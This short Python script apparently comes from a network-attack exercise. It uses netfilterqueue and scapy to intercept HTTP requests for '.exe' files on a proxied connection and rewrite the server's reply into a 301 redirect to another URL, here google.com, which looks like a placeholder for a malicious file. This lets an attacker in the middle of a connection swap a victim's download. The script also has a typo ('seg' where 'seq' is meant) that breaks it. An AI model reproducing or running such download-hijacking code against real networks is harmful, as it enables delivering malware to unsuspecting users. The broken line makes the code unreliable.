#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packets = scapy.IP(packet.get_payload())
    if scapy_packets.haslayer(scapy.Raw):
        if scapy_packets[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packets[scapy.Raw].load and "https://www.google.com" not in scapy_packets[scapy.Raw].load:
                print("[+] exe request")
                ack_list.append(scapy_packets[scapy.TCP].ack)
        elif scapy_packets[scapy.TCP].sport == 10000:
            if scapy_packets[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packets[scapy.TCP].seg)
                print("[+] replacing download")
                modified_packet = set_load(scapy_packets, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.google.com\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
